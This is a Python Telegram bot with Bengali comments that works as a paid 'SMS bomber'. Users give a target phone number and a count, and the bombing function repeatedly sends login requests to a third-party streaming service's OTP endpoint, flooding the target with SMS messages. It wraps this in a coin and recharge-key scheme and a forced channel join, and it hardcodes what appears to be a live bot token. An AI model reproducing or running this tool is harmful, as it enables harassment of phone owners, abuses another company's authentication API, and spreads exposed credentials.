import telebot
import requests
import json
import os
import time
import threading
from telebot import types

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 6363065063 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" # এখানে @ অবশ্যই থাকবে
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

# বট অবজেক্ট (বাগ ফিক্সড)
bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস লোডার (অত্যন্ত শক্তিশালী) ---
def load_db(file):
    if not os.path.exists(file) or os.stat(file).st_size == 0:
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    with open(file, 'r') as f:
        try: return json.load(f)
        except: return {}

def save_db(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

# গ্লোবাল ডাটাবেস লোড
users = load_db('users.json')
keys = load_db('keys.json')

# --- ভেরিফিকেশন চেক ফাংশন ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Join Check Error: {e}")
        return False

# --- ওয়েলকাম এনিমেশন এবং মেনু ---
def send_welcome_screen(chat_id, first_name):
    # এনিমেশন ইফেক্ট
    anim = bot.send_message(chat_id, "🔍 **Verifying Your Profile...**")
    time.sleep(1)
    bot.edit_message_text("🛡️ **Security Check Passed!**", chat_id, anim.message_id)
    time.sleep(1)
    bot.edit_message_text("⚡ **Loading DU ModZ Interface...**", chat_id, anim.message_id)
    time.sleep(1)
    bot.delete_message(chat_id, anim.message_id)

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Recharge", callback_data="recharge"),
        types.InlineKeyboardButton("📢 Channel", url="https://t.me/DemoTestDUModz"),
        types.InlineKeyboardButton("🌐 Website", url="https://darkunkwonmodz.blogspot.com")
    )
    
    caption = (f"🔥 **Welcome {first_name}!** 🔥\n"
               f"---------------------------------\n"
               f"👑 **Owner:** Dark Unkwon ModZ\n"
               f"💰 **Status:** `Verified ✅`\n"
               f"🚀 **Power:** `Ultra High Speed`\n"
               f"---------------------------------")
    bot.send_photo(chat_id, LOGO_URL, caption=caption, reply_markup=markup)

# --- কমান্ড হ্যান্ডলার ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = str(message.from_user.id)
    uname = message.from_user.first_name
    
    # ইউজার ডাটাবেস আপডেট
    if uid not in users:
        users[uid] = {"coins": 30, "status": "active", "sent": 0}
        save_db('users.json', users)
        try: bot.send_message(LOG_CHANNEL, f"🆕 **New User:** [{uname}](tg://user?id={uid})")
        except: pass

    # অটো ভেরিফাই চেক
    if is_joined(message.from_user.id):
        send_welcome_screen(message.chat.id, uname)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/DemoTestDUModz"))
        markup.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Verification Required!**\n\nPlease join our channel to use this bot.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_logic(call):
    uid = str(call.from_user.id)
    
    if call.data == "verify":
        if is_joined(call.from_user.id):
            bot.answer_callback_query(call.id, "✅ Verified!")
            bot.delete_message(call.message.chat.id, call.message.message_id)
            send_welcome_screen(call.message.chat.id, call.from_user.first_name)
        else:
            bot.answer_callback_query(call.id, "❌ Join first!", show_alert=True)

    elif call.data == "profile":
        u = users.get(uid, {"coins":0, "status":"active", "sent":0})
        bot.send_message(call.message.chat.id, f"👤 **User Info**\n💰 Coins: `{u['coins']}`\n📊 Status: `{u['status'].upper()}`\n🚀 Sent: `{u['sent']}`")

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Recharge Key:**")
        bot.register_next_step_handler(msg, process_recharge)

    elif call.data == "bomb":
        if users.get(uid, {}).get('status') == "blocked":
            bot.send_message(call.message.chat.id, "🚫 Blocked!")
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
        bot.register_next_step_handler(msg, get_number)

# --- রিচার্জ লজিক ---
def process_recharge(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        val = keys[key]
        if val == "lifetime": users[uid]['status'] = "lifetime"
        else: users[uid]['coins'] += int(val)
        del keys[key] # Expire the key
        save_db('keys.json', keys)
        save_db('users.json', users)
        bot.send_message(message.chat.id, "✅ **Success!** Coins added and key expired.")
    else:
        bot.send_message(message.chat.id, "❌ Invalid Key!")

# --- এসএমএস লজিক ---
def get_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
    else:
        bot.send_message(message.chat.id, "❌ Wrong number!")

def start_attack(message, num):
    try:
        amount = int(message.text)
        uid = str(message.from_user.id)
        cost = amount * 5
        if users[uid]['status'] != 'lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ Need {cost} coins!")
            return
        bot.send_message(message.chat.id, f"🚀 **Sent {amount} SMS to {num}...**")
        threading.Thread(target=bombing, args=(uid, num, amount, cost)).start()
    except: bot.send_message(message.chat.id, "❌ Error!")

def bombing(uid, num, amount, cost):
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    payload = {"number": "+88" + num}
    success = 0
    for _ in range(amount):
        try:
            r = requests.post(url, json=payload, timeout=5)
            if r.status_code == 200: success += 1
        except: pass
        time.sleep(1)
    if users[uid]['status'] != 'lifetime': users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)

# --- অ্যাডমিন ---
@bot.message_handler(commands=['gen'])
def gen(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        val = message.text.split()[1]
        k = "DU-" + os.urandom(3).hex().upper()
        keys[k] = val
        save_db('keys.json', keys)
        bot.reply_to(message, f"🔑 **Key:** `{k}`\nValue: {val}")
    except: bot.reply_to(message, "/gen <amount>")

# --- সলিড রান ---
if __name__ == "__main__":
    print("Bot is Running...")
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
